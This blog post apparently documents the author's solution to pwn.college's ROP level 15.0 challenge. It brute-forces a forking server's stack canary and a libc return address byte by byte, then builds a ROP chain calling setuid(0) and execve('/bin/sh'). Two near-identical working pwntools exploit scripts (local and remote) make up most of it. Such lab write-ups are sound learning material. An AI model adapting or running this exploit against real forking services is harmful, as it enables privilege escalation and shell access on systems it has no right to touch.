+++
title = 'pwn.college - ROP 15.0'
date = 2023-09-22T15:25:27-04:00
tags = ["pwn", "rop", "asu"]
description = "In this section, I will be solving the last challenge of the Return Oriented Programming module on pwn.college, this challenge was straight up diabolical but really enjoyable."
draft = false
+++
Purely Diabolical, but fun. This challenge unfortunately took me about 24 hours in total, of just me fixing the exploit making little changes and more.
```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

This challenge, was as hard as it can be, luckily for us the vulnerability is very obvious, like in most `pwn.college` challenges so far, so we just have to think of a way to successfully exploit this binary.

It's a fork server, so as you may expect, it'll involve bruteforcing of the canary, in order to overwrite past it.

We also can only use a single gadget, however we can bruteforce the return address of main.

This is shitty because main returns into `libc`, so we have to `ROP` from there.

What i did was, i chose an offset in `libc` then i bruteforce the return address starting at the second last-byte all the way down to the first-byte.

For example, 0x**007fffffffffd0**c8, we bruteforce starting from the last byte in bold, all the way to the first one.

Then i subtracted the offset from the bruteforced value, and this results in the base address of `libc`.

Once we get the base address of `libc` it's winner winner chicken dinner.

One problem i had when solving this challenge, is that the binary mentions it only accepts a single connection at a time, sometimes when returning at a random spot in `libc`, the process would either restart or hang.

This is bad because it stops us from connecting to the vulnerable server, so we have to kill the child processes everytime we don't make the program exit or crash.

## Solution (local)
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./babyrop_level15.0
from pwn import *
import sys, os
import psutil

context.log_level = "error"

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './babyrop_level15.0')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def get_process():
    process_name = "babyrop_level15.0"

    for process in psutil.process_iter(['pid', 'name']):
        try:
            if process.info['name'] == process_name:
                return process.info['pid']
        except:
            return 0

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled


canary = b"\x00"
if len(sys.argv) >= 2:
    if sys.argv[1] == "-c":
        with open("canary.txt", "r") as file:
            canary = bytes.fromhex(file.readline())
            print(f"Using canary from file canary.txt")
            file.close()

if len(canary) == 1:
    while True:
        if len(canary) == 8:
            break
        for y in range(0, 256):
            print(f"Bruteforcing byte {len(canary) + 1} of canary with {p8(y)} :: {canary[::-1].hex()}")
            io = remote("127.0.0.1", 1337)
            p = [
                b"A" * 0x28, canary, p8(y)
            ]

            io.send(b"".join(p))
            output = io.recvall(timeout=4)
            if not b"stack smashing" in output:
                io.close()
                # start second check
                io = remote("127.0.0.1", 1337)
                io.send(b"".join(p))
                output = io.recvall(timeout=4)
                if not b"stack smashing" in output:
                    print(f"Found value {p8(y)} at offset {len(canary) + 1}")
                    io.close()
                    canary += p8(y)
                    break

            io.close()

        if len(canary) == 8:
            break

print(f"Using Canary: {canary[::-1].hex()}")
print(f"Using Canary: {canary.hex()}")
print(canary)

with open("canary.txt", "w+") as file:
    file.write(canary.hex())
    file.close()

ret_val = b"\xb6\x7c"

print("STARTING RET BRUTE PRESS A KEY")
input()

if len(sys.argv) >= 3:
    if sys.argv[2] == "-r":
        with open("ret.txt", "r") as file:
            ret_val = bytes.fromhex(file.readline())

if len(ret_val) == 2:
    while True:
        if len(ret_val) == 8:
            break
        for y in range(0, 256):
            print(f"Bruteforcing offset {len(ret_val)+1} of return value with {p8(y)} :: {ret_val[::-1].hex()}")
            io = remote("127.0.0.1", 1337)
            p = [
                b"A" * 0x28, canary, b"B" * 0x8,
                ret_val, p8(y)
            ]

            io.send(b"".join(p))
            t = io.recvuntil(b"Goodbye!\n")
            if b"stack smashing" in t:
                print("odd")
            output = io.recvall(timeout=4)
            print(output)
            if b"Welcome" in output:
                ret_val += p8(y)
                io.close()
                parent = psutil.Process(get_process())
                for child in parent.children(recursive=True):
                    child.kill()
                break

            io.close()
            parent = psutil.Process(get_process())
            for child in parent.children(recursive=True):
                child.kill()

        if len(ret_val) == 8:
            break


ret_val = ret_val.ljust(8, b"\x00")
#print(ret_val)
#print(f"RETURN VALUE: {ret_val.hex()}")
print(f"RETURN VALUE: {ret_val[::-1].hex()}")
with open("ret.txt", "w+") as file:
    file.write(ret_val.hex())
    file.close()

print(ret_val)
print(ret_val.hex())
ret_val = int(ret_val[::-1].hex()[2:], 16) - 0x27cb6
#ret_val = ret_val - 0x24013
libc = ELF("/usr/lib/libc.so.6")
print(f"libc base is at {hex(ret_val)}")
libc.address = ret_val
rop = ROP(libc)

parent = psutil.Process(get_process())
for child in parent.children(recursive=True):
    child.kill()

io = remote("127.0.0.1", 1337)
p = [
    b"A" * 0x28, canary, b"B"*0x8,
    p64(rop.find_gadget(['pop rdi', 'ret'])[0]), p64(0),
    p64(libc.sym.setuid),
    p64(rop.find_gadget(['pop rdi', 'ret'])[0]), p64(next(libc.search(b"/bin/sh"))),
    p64(rop.find_gadget(['pop rsi', 'ret'])[0]), p64(0),
    p64(libc.sym.execve)
    ]

io.send(b"".join(p))
io.interactive()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

#io.interactive()
```

## Solution (remote)
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./babyrop_level15.0
from pwn import *
import sys, os
import psutil

context.log_level = "error"

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyrop_level15.0')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def get_process():
    process_name = "babyrop_level15.0"

    for process in psutil.process_iter(['pid', 'name']):
        try:
            if process.info['name'] == process_name:
                return process.info['pid']
        except:
            return 0

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled


canary = b"\x00"
if len(sys.argv) >= 2:
    if sys.argv[1] == "-c":
        with open("canary.txt", "r") as file:
            canary = bytes.fromhex(file.readline())
            print(f"Using canary from file canary.txt")
            file.close()

if len(canary) == 1:
    while True:
        if len(canary) == 8:
            break
        for y in range(0, 256):
            print(f"Bruteforcing byte {len(canary) + 1} of canary with {p8(y)} :: {canary[::-1].hex()}")
            io = remote("127.0.0.1", 1337)
            p = [
                b"A" * 0x28, canary, p8(y)
            ]

            io.send(b"".join(p))
            output = io.recvall(timeout=4)
            if not b"stack smashing" in output:
                io.close()
                # start second check
                io = remote("127.0.0.1", 1337)
                io.send(b"".join(p))
                output = io.recvall(timeout=4)
                if not b"stack smashing" in output:
                    print(f"Found value {p8(y)} at offset {len(canary) + 1}")
                    io.close()
                    canary += p8(y)
                    break

            io.close()

        if len(canary) == 8:
            break

print(f"Using Canary: {canary[::-1].hex()}")
print(f"Using Canary: {canary.hex()}")
print(canary)

with open("canary.txt", "w+") as file:
    file.write(canary.hex())
    file.close()

ret_val = b"\x69"

print("STARTING RET BRUTE PRESS A KEY")
input()

if len(sys.argv) >= 3:
    if sys.argv[2] == "-r":
        with open("ret.txt", "r") as file:
            ret_val = bytes.fromhex(file.readline())

if len(ret_val) == 1:
    while True:
        if len(ret_val) == 8:
            break
        for y in range(0, 256):
            print(f"Bruteforcing offset {len(ret_val)+1} of return value with {p8(y)} :: {ret_val[::-1].hex()}")
            io = remote("127.0.0.1", 1337)
            p = [
                b"A" * 0x28, canary, b"B" * 0x8,
                ret_val, p8(y)
            ]

            io.send(b"".join(p))
            t = io.recvuntil(b"Goodbye!\n")
            if b"stack smashing" in t:
                print("odd")
            output = io.recvall(timeout=4)
            print(output)
            if b"Welcome" in output:
                ret_val += p8(y)
                io.close()
                parent = psutil.Process(get_process())
                for child in parent.children(recursive=True):
                    child.kill()
                break

            io.close()
            parent = psutil.Process(get_process())
            for child in parent.children(recursive=True):
                child.kill()

        if len(ret_val) == 8:
            break


ret_val = ret_val.ljust(8, b"\x00")
#print(ret_val)
#print(f"RETURN VALUE: {ret_val.hex()}")
print(f"RETURN VALUE: {ret_val[::-1].hex()}")
with open("ret.txt", "w+") as file:
    file.write(ret_val.hex())
    file.close()

print(ret_val)
print(ret_val.hex())
ret_val = int(ret_val[::-1].hex()[2:], 16) - 0x24069
#ret_val = ret_val - 0x24013
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
print(f"libc base is at {hex(ret_val)}")
libc.address = ret_val
rop = ROP(libc)

parent = psutil.Process(get_process())
for child in parent.children(recursive=True):
    child.kill()

io = remote("127.0.0.1", 1337)
p = [
    b"A" * 0x28, canary, b"B"*0x8,
    p64(rop.find_gadget(['pop rdi', 'ret'])[0]), p64(0),
    p64(libc.sym.setuid),
    p64(rop.find_gadget(['pop rdi', 'ret'])[0]), p64(next(libc.search(b"/bin/sh"))),
    p64(rop.find_gadget(['pop rsi', 'ret'])[0]), p64(0),
    p64(libc.sym.execve)
    ]

io.send(b"".join(p))
io.interactive()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

#io.interactive()
```
